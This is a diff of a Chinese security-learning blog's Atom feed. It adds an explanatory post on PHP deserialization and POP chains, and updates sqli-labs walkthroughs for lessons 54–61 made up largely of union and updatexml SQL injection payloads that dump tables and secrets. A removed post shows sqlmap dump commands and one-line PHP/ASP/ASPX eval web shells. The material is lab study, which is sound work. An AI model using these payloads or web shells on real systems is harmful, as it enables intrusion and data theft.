@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-18T12:23:21.124Z</updated>
+  <updated>2022-02-20T11:17:09.745Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,11 +17,36 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>php反序列化漏洞的认识与学习</title>
+    <link href="http://example.com/2022/02/18/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%AE%A4%E8%AF%86%E4%B8%8E%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://example.com/2022/02/18/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%AE%A4%E8%AF%86%E4%B8%8E%E5%AD%A6%E4%B9%A0/</id>
+    <published>2022-02-18T12:57:07.000Z</published>
+    <updated>2022-02-20T11:17:09.745Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h1><p>序列化，即将php对象转换成字符串的一种操作，目的是为了有效地保护对象，并且不丢失其类型和结构</p><p>反序列化，即将符合格式的字符串转换为php对象，这个对象的类必须在反序列化之前定义，可以通过包含一个定义该类的文件来完成</p><h2 id="序列化后"><a href="#序列化后" class="headerlink" title="序列化后"></a>序列化后</h2><p>O:4:”text”:3:{s:10:”textflag”;s:7:”*text”;s:4:”text”;s:5:”text1”;}</p><p>String:s</p><p>Integer:i</p><p>Boolean:b</p><p>Null:N</p><p>Array:a</p><p>Object:o</p><p><img src="https://s2.loli.net/2022/02/19/IJe93ycmFqKSOWs.png" alt="QQ截图20220219185351.png"></p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ol><li>__construct()   //当对象创建的时候自动调用（但是在unserialize()时是不会自动调用的）</li><li>__wakeup()//当unserialize()时自动调用</li><li>__destruct()//当对象被销毁时自动调用</li><li>__toString()//当反序化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li><li>__get()//当从不可访问的属性读取数据</li><li>__call()//在上下文中调用不可访问方法时触发</li></ol><h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="__wakeup()绕过"></a>__wakeup()绕过</h2><p>php5&lt;5.6.25</p><p>php7&lt;7.0.10</p><p>unserialize（）会检查一个__wakeup()方法，如果存在，则会先调用—-wakeup()方法，预先准备对象需要的资源</p><p>反序列化时，如果对象属性个数值大于真实的属性个数时就会跳过__wakeup()的执行</p><h2 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h2><p>POP面向属性编程常用于上层语言构造特定调用连的方法，与二进制利用中的面向返回编程的原理相同，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构造一组连续的调用链，最终达到攻击者的目的。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;php序列化&quot;&gt;&lt;a href=&quot;#php序列化&quot; class=&quot;headerlink&quot; title=&quot;php序列化&quot;&gt;&lt;/a&gt;php序列化&lt;/h1&gt;&lt;p&gt;序列化，即将php对象转换成字符串的一种操作，目的是为了有效地保护对象，并且不丢失其类型和结构&lt;/p&gt;
+&lt;p</summary>
+      
+    
+    
+    
+    <category term="php" scheme="http://example.com/categories/php/"/>
+    
+    
+    <category term="php" scheme="http://example.com/tags/php/"/>
+    
+  </entry>
+  
+  <entry>
     <title>lesson54_61</title>
     <link href="http://example.com/2022/02/08/lesson50/"/>
     <id>http://example.com/2022/02/08/lesson50/</id>
     <published>2022-02-08T10:18:18.000Z</published>
-    <updated>2022-02-18T12:23:21.124Z</updated>
+    <updated>2022-02-18T12:55:55.224Z</updated>
     
     <content type="html"><![CDATA[<h1 id="lesson54"><a href="#lesson54" class="headerlink" title="lesson54"></a>lesson54</h1><p>一般的联合查询注入，但只有十次机会</p><p>?id=1</p><p><img src="https://s2.loli.net/2022/02/18/I8q1zRoJSOjFfXU.png" alt="QQ截图20220218184638.png"></p><p>?id=1’ order by 3–+</p><p><img src="https://s2.loli.net/2022/02/18/9xHlZKoG5D3qtaE.png" alt="QQ截图20220218184904.png"></p><p>?id=1’ order by 4–+</p><p><img src="https://s2.loli.net/2022/02/18/qNX9eOfsVoZvgc3.png" alt="QQ截图20220218185026.png"></p><p>?id=-1’ union select 1,2,3–+</p><p><img src="https://s2.loli.net/2022/02/18/3OcyfzZQ9Xgtb8C.png" alt="QQ截图20220218185205.png"></p><p>?id=-1’ union select 1,2,database()–+</p><p><img src="https://s2.loli.net/2022/02/18/wRpsKIhYciHz5WB.png" alt="QQ截图20220218185315.png"></p><p>?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p><img src="https://s2.loli.net/2022/02/18/w6FYqVcPNrBStCk.png" alt="QQ截图20220218192118.png"></p><p>?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’t87qfwjwea’–+</p><p><img src="https://s2.loli.net/2022/02/18/lQUgki1Z3PdKsOx.png" alt="QQ截图20220218191401.png"></p><p>?id=-1’ union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_X1KA))from challenge.t87qfwjwea–+</p><p><img src="https://s2.loli.net/2022/02/18/9vaJbfgKRrhU2tA.png" alt="QQ截图20220218192008.png"></p><p>唯一要说的就是这关如果注入超过十次，表名和字段就会变非常恶心</p><h1 id="lesson55"><a href="#lesson55" class="headerlink" title="lesson55"></a>lesson55</h1><p>?id=-1) union select 1,2,database()–+</p><p>?id=-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p>?id=-1) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’7lyan613nt’–+</p><p>?id=-1) union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_W8HV))from challenges.7lyan613nt–+</p><h1 id="lesson56"><a href="#lesson56" class="headerlink" title="lesson56"></a>lesson56</h1><p>?id=-1’) union select 1,2,database()–+</p><p>?id=-1’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p>?id=-1’) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’lby5b1quon’–+</p><p>?id=-1’) union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_6JN1))from challenges.lby5b1quon–+</p><h1 id="lesson-57"><a href="#lesson-57" class="headerlink" title="lesson 57"></a>lesson 57</h1><p>?id=-1” union select 1,2,database()–+</p><p>?id=-1” union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p><p>?id=-1” union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’2by8hxznwc’–+</p><p>?id=-1” union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_LXMN))from challenges.2by8hxznwc–+</p><h1 id="lesson58"><a href="#lesson58" class="headerlink" title="lesson58"></a>lesson58</h1><p>?id=1’and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p><p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p><p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’6kkc70flk9’),0x7e),1)–+</p><p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JXDL))from challenges.6kkc70flk9),0x7e),1)–+</p><h1 id="lesson59"><a href="#lesson59" class="headerlink" title="lesson59"></a>lesson59</h1><p>?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p><p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p><p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’062lvunx5i’),0x7e),1)–+</p><p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_2XKL))from challenges.062lvunx5i),0x7e),1)–+</p><h1 id="lesson-60"><a href="#lesson-60" class="headerlink" title="lesson 60"></a>lesson 60</h1><p>?id=1”) and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p><p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p><p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’qlbva5vmrz’),0x7e),1)–+</p><p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JCJO))from challenges.qlbva5vmrz),0x7e),1)–+</p><h1 id="lesson-61"><a href="#lesson-61" class="headerlink" title="lesson 61"></a>lesson 61</h1><p>?id=1’)) and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p><p>?id=1’)) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p><p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’qlbva5vmrz’),0x7e),1)–+</p><p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JCJO))from challenges.qlbva5vmrz),0x7e),1)–+</p>]]></content>
     
@@ -453,31 +478,6 @@
     
     <category term="python" scheme="http://example.com/categories/python/"/>
     
-    
-  </entry>
-  
-  <entry>
-    <title>lesson5，6总结</title>
-    <link href="http://example.com/2021/10/27/less5,6/"/>
-    <id>http://example.com/2021/10/27/less5,6/</id>
-    <published>2021-10-27T04:19:09.000Z</published>
-    <updated>2022-02-06T09:15:55.104Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="1-注入类型"><a href="#1-注入类型" class="headerlink" title="1.注入类型"></a>1.注入类型</h1><p><strong>sql注入形成的原因：用户被输入的非法数据被解释器执行</strong></p><h2 id="由注入类容区分为："><a href="#由注入类容区分为：" class="headerlink" title="由注入类容区分为："></a>由注入类容区分为：</h2><ol><li>数字类型注入</li><li>字符类型注入</li></ol><h2 id="由提交方式分为："><a href="#由提交方式分为：" class="headerlink" title="由提交方式分为："></a>由提交方式分为：</h2><ol><li>get注入</li><li>post注入</li><li>cookies注入</li><li>http注入</li></ol><h2 id="由获取信息不同分为："><a href="#由获取信息不同分为：" class="headerlink" title="由获取信息不同分为："></a>由获取信息不同分为：</h2><ol><li>基于bool的盲注，即可以根据返回页面判断条件真假的注入</li><li>基于时间的盲注，即不能根据页面返回类容判断任何信息，需要用条件语句查看时间延迟语句是否执行来判断。</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接放回在页面中。</li></ol><hr><hr><p>很明显less1-4都是基于页面返回错误信息的报错注入，而从less5开始接触基于返回页面判断语句真假的bool注入</p><p><img src="https://i.loli.net/2021/10/27/oD3qw2Fr7TzHImE.png" alt="QQ截图20211027124159.png"></p><p>同样的用?id=1’ –+来判断注入</p><p>用?id=1’ order by 3–+来判断列数</p><p>但是无法用union select 来输出我们想要的内容</p><p>而是需要运用到 left（a,b）来<del>（推测）</del>暴力破解出它的表名，列名，库名甚至是字段</p><p>先演示，用?id=1’ and left((database()),1)=’a’ –+</p><p><img src="https://i.loli.net/2021/10/27/JbPU9kNjqZc6oxG.png" alt="QQ截图20211027125618.png"></p><p>以此类推直到查到库名的第一个字符是’s’</p><p><img src="https://i.loli.net/2021/10/27/xRpUOGof3X781tB.png" alt="QQ截图20211027125834.png"></p><p>然后再爆破库名第二个字符</p><p>直到我们把库名，表名，列名还有字段都爆破出来。</p><p>想到这头皮发麻，那么有没有更简单的方法呢？有！</p><hr><h1 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h1><p>利用ascii()来将返回的字母转换成数字(整型)，</p><p>?id=1’ and ascii(substr((database()),1,1))&gt;110–+来减少执行语句的优化。</p><p>一般般。</p><hr><h1 id="burpsuite爆破"><a href="#burpsuite爆破" class="headerlink" title="burpsuite爆破"></a>burpsuite爆破</h1><p>用burpsuite挂代理（proxy）</p><p><img src="https://i.loli.net/2021/10/27/mKYzUd1gnE8SBFu.png" alt="QQ截图20211027130429.png"></p><p>然后把请求发给instruder</p><p><img src="https://i.loli.net/2021/10/27/SRiKkcAfvL37Zad.png" alt="QQ截图20211027130503.png"></p><p>对left((database()),1)=’’ 引号里面 add$,单参数</p><p>调整sniper的攻击模式，调整字典为“abcdefghijklmnopqrstuvwxyz”</p><p>然后start attack，开始爆破</p><p><img src="https://i.loli.net/2021/10/27/h6IV3isf5jwgprl.png" alt="QQ截图20211027132122.png"></p><p>然后字长不一样的就是正确的</p><p>这样省了我们改字母的时间但是无法明确的给出库名还是得一个一试然后拼凑在一起。</p><p>那么还有更简便的方法吗？有</p><hr><h1 id="sqlmap应用"><a href="#sqlmap应用" class="headerlink" title="sqlmap应用"></a>sqlmap应用</h1><h2 id="哈哈！时代变啦！"><a href="#哈哈！时代变啦！" class="headerlink" title="哈哈！时代变啦！"></a>哈哈！时代变啦！</h2><p>直接cmd-&gt;py sqlmap.py  -u ‘<a href="http://localhost/Less-5/?id=&#39;">http://localhost/Less-5/?id=&#39;</a> –dbs  爆库</p><p>py  sqlmap.py -u ‘<a href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” –tables 爆表</p><p>py sqlmap.py -u ‘<a href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” -T”表名” –columns 爆字段</p><p>py sqlmap.py -u ‘<a href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” -T”表名” -C”字段名” –dump  打包丢出</p><p>简单易懂，一步到位</p><p>详见“鲲鹏杯战后总结”</p><hr><h1 id="补充基本知识"><a href="#补充基本知识" class="headerlink" title="补充基本知识"></a>补充基本知识</h1><ol><li>一句话木马：</li></ol><p>php的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_post</span>[<span class="string">&quot;crow&quot;</span>]);<span class="meta">?&gt;</span>  <span class="comment">//其中crow为密码</span></span><br></pre></td></tr></table></figure><p>asp的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval requst(crow)%&gt;</span><br></pre></td></tr></table></figure><p>aspx的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;啥语言&quot;%&gt;&lt;%eval(Requst.Item[&quot;crow&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p>配合 菜刀 蚁剑 食用 味道更佳</p><ol start="2"><li>load_file() 读取当地文件</li><li>into outfile 写文件  select ‘crow666’ into outfile  ‘C:\phpstudy\text.txt’</li></ol>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;1-注入类型&quot;&gt;&lt;a href=&quot;#1-注入类型&quot; class=&quot;headerlink&quot; title=&quot;1.注入类型&quot;&gt;&lt;/a&gt;1.注入类型&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;sql注入形成的原因：用户被输入的非法数据被解释器执行&lt;/strong&gt;&lt;/p&gt;
-&lt;h2 i</summary>
-      
-    
-    
-    
-    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
-    
-    
-    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
